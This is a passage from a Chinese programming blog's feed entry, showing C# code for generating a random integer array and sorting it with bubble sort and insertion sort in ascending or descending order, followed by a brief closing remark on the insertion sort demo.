class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BasicStructure</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">CSharpArray</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] array;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">CSharpArray</span>(<span class="params"><span class="keyword">int</span> count</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            array = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                array[i] = random.Next(count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span>[] <span class="title">getArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintArray</span>(<span class="params"><span class="keyword">int</span> []array</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> count=array.Length;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.Write(<span class="string">"\t&#123;0&#125;"</span>, array[i]);</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 冒泡排序算法</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="array"&gt;</span>待排序的数组<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="orderType"&gt;</span>排序类型 0：升序；1：降序<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BubbleSort</span>(<span class="params"><span class="keyword">int</span> []array,<span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp;</span><br><span class="line">            <span class="keyword">int</span> count = array.Length;</span><br><span class="line">            <span class="keyword">if</span>(orderType==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>])</span><br><span class="line">                        &#123;</span><br><span class="line">                            temp = array[j];</span><br><span class="line">                            array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">                            array[j + <span class="number">1</span>] = temp;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(orderType==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (array[j] &lt; array[j + <span class="number">1</span>])</span><br><span class="line">                        &#123;</span><br><span class="line">                            temp = array[j];</span><br><span class="line">                            array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">                            array[j + <span class="number">1</span>] = temp;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 插入排序算法</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="array"&gt;</span>待排序的数组<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="orderType"&gt;</span>排序类型 0：升序；1：降序<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span>(<span class="params"><span class="keyword">int</span>[] array,<span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>,temp;</span><br><span class="line">            <span class="keyword">int</span> count = array.Length;</span><br><span class="line">            <span class="keyword">if</span> (orderType == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp = array[i];</span><br><span class="line">                    j = i;</span><br><span class="line">                    <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)</span><br><span class="line">                    &#123;</span><br><span class="line">                        array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">                        j -= <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    array[j] = temp;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (orderType == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp = array[i];</span><br><span class="line">                    j = i;</span><br><span class="line">                    <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &lt;= temp)</span><br><span class="line">                    &#123;</span><br><span class="line">                        array[j] = array[j - <span class="number">1</span>];</span><br><span class="line">                        j -= <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    array[j] = temp;</span><br><span class="line">                    PrintArray(array);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; OK，插入排序算法的基本演示就到此结束！</p><p>&ensp; &ensp; &ensp; 注：由于数组时代码里生成的随机数组，因此每次运行的结果基本不一样，可能与以上演示结果不同。</p><p><span><a>反馈请点击:</a><a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=lKWmp62soKykoqLU5eW69-v5" style="text-decoration:none"><img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_11.png" alt></a></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 之前写了一个冒泡排序算法，这里再加一个&lt;a href=&quot;http://student.zjzk.cn/course_ware/data_structure/web/paixu/paixu8.2.1.1.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;font color=&quot;blue&quot;&gt;插入排序算法&lt;/font&gt;&lt;/a&gt;，链接里讲得也比较详细，不过为了熟练，还是自己亲自敲一遍，再次贴出来，分享一下&lt;/p&gt;
&lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 还是先上代码：&lt;br&gt;
    
    </summary>
    
    
      <category term="data structure" scheme="http://blog.lxzh.app/tags/data-structure/"/>
    
  </entry>
  
</feed>
